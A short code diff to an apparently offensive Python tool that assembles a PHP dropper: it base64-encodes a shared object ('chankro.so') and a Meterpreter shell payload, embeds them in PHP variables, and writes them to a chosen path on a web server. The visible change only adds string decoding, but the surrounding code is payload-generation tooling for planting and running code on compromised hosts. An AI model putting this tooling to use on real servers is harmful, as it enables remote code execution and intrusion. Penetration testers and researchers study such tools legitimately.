@@ -65,8 +65,8 @@ with open(archi, "rb") as bicho:
     encoded_bicho = base64.b64encode(bicho.read())
 
 
-head = "<?php\n $hook = '" + encoded_bicho + "';\n"
-body1 = "$meterpreter = '" + encoded_shell + "';\n"
+head = "<?php\n $hook = '" + encoded_bicho.decode("utf-8") + "';\n"
+body1 = "$meterpreter = '" + encoded_shell.decode("utf-8") + "';\n"
 body2 = "file_put_contents('" + args.pati + \
     "/chankro.so', base64_decode($hook));\n"
 body3 = "file_put_contents('" + args.pati + \
